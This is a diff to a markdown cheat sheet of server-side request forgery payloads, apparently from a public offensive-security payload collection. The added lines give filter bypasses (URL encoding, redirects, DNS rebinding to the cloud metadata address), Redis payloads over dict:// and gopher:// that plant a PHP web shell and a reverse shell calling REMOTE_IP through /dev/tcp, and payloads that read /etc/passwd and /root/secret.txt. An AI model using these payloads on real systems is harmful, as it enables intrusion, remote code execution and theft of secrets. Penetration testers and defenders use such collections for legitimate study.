@@ -15,6 +15,7 @@
   * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
   * [Bypass using malformed urls](#bypass-using-malformed-urls)
   * [Bypass using rare address](#bypass-using-rare-address)
+  * [Bypass using URL encoding](#bypass-using-url-encoding)
   * [Bypass using bash variables](#bypass-using-bash-variables)
   * [Bypass using tricks combination](#bypass-using-tricks-combination)
   * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
@@ -30,7 +31,9 @@
   * [gopher://](#gopher)
   * [netdoc://](#netdoc)
 * [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
+* [SSRF exploiting Redis](#ssrf-exploiting-redis)
 * [SSRF to XSS](#ssrf-to-xss)
+* [SSRF from XSS](#ssrf-from-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
   * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
@@ -74,22 +77,6 @@ Basic SSRF - Alternative version
 http://localhost:80
 http://localhost:443
 http://localhost:22
-```
-
-Advanced exploit using a redirection
-
-```powershell
-1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
-2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
-vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
-```
-
-Advanced exploit using type=url
-
-```powershell
-Change "type=file" to "type=url"
-Paste URL in text field and hit enter
-Using this vulnerability users can upload images from any image URL = trigger an SSRF
 ```
 
 ## Bypassing filters
@@ -177,6 +164,15 @@ http://127.1
 http://127.0.1
 ```
 
+### Bypass using URL encoding
+
+[Single or double encode a specific URL to bypass blacklist](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+
+```powershell
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+```
+
 ### Bypass using bash variables 
 
 (curl only)
@@ -225,6 +221,30 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
+### Bypassing using a redirect
+[using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
+
+```powershell
+1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
+2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+```
+
+### Bypassing using type=url
+
+```powershell
+Change "type=file" to "type=url"
+Paste URL in text field and hit enter
+Using this vulnerability users can upload images from any image URL = trigger an SSRF
+```
+
+### Bypassing using DNS Rebinding (TOCTOU)
+
+```powershell
+Create a domain that change between two IPs. http://1u.ms/ exists for this purpose.
+For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain:
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+```
 
 ## SSRF exploitation via URL Scheme
 
@@ -378,6 +398,32 @@ gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
 | value data            | (n bytes) |    | /tmp/test.py   |   |
 	
 
+## SSRF exploiting Redis
+
+> Redis is a database system that stores everything in RAM
+
+```powershell
+# Getting a webshell
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+url=dict://127.0.0.1:6379/SAVE
+
+# Getting a PHP reverse shell
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+gopher://127.0.0.1:6379/_save
+```
+
+## SSRF exploiting PDF file
+
+Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)
+
+```powershell
+<link rel=attachment href="file:///root/secret.txt">
+```
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
@@ -388,6 +434,25 @@ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple 
 
 https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
 ```
+
+## SSRF from XSS
+
+### Using an iframe
+
+The content of the file will be integrated inside the PDF as an image or text.
+
+```html
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+```
+
+### Using an attachment
+
+Example of a PDF attachment using HTML 
+
+1. use `<link rel=attachment href="URL">` as Bio text
+2. use 'Download Data' feature to get PDF
+3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
+4. `cat attachment.bin`
 
 ## SSRF URL for Cloud Instances
 
@@ -407,7 +472,6 @@ DNS record
 ```powershell
 http://instance-data
 http://169.254.169.254
-http://metadata.nicob.net/
 http://169.254.169.254.xip.io/
 http://1ynrnhl.xip.io/
 http://www.owasp.org.1ynrnhl.xip.io/
